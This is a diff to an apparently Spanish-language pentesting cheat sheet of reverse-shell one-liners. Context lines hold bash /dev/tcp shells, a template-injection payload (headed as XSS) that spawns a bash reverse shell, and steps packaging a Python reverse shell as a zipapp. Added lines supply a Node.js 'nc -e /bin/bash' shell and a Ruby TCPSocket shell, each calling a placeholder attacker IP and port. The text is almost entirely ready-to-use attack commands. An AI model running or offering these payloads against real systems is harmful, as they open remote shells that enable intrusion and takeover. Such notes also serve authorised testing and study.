@@ -50,7 +50,7 @@ echo ‘bash -c “bash-i >& /dev/tcp/IP/PORT 0>&1”’ | bash
 sh -i >& /dev/tcp/<IP>/<PORT> 0>&1
 ```
 
-## Con JavaScript desde un XSS
+## Desde un XSS
 
 ```bash
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"').read() }}
@@ -87,4 +87,20 @@ reverse_shell()
 mkdir reverseshell
 mv revshell.py reverseshell
 python3 -m zipapp reverseshell -o revshell.pyz -m "revshell:revshell"
+```
+## Con JavaScript
+
+```jsx
+require('child_process').exec('nc -e /bin/bash <IP> <PORT>')
+```
+
+## Con Ruby
+
+```ruby
+ruby -rsocket -e '
+  spawn(
+    "bash",
+    [:in, :out, :err] => TCPSocket.new("<IP>", <PORT>)
+  )
+'
 ```
